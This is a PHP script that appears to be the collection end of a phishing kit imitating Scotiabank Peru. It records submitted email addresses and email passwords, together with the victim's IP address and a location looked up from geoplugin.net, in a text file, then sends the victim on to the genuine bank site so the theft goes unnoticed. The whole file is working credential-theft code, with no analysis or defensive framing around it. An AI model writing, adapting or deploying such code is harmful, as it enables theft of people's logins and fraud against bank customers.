<?php
ini_set("display_errors", 0);
session_start();
include('nombre_archivo.php');

function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];

if( isset($_POST['correo2']) && isset($_POST['clvcorreo2']) ){
	
$file = fopen("".$nombre_archivo.".txt", "a");
fwrite($file, "|| EMAIL2 : ".$_POST['correo2']. PHP_EOL);
fwrite($file, "|| Clave EMAIL2 : ".$_POST['clvcorreo2']. PHP_EOL);
fwrite($file, "|| IP DE USUARIO: ".$myip." ".$pais." ".$region." ".date('d/m/Y'). PHP_EOL);
fwrite($file, "||=====================" . PHP_EOL);
fclose($file);




echo '<script type="text/javascript">window.location.href = "https://www.scotiabank.com.pe/Personas/Default";</script>';

}
?>
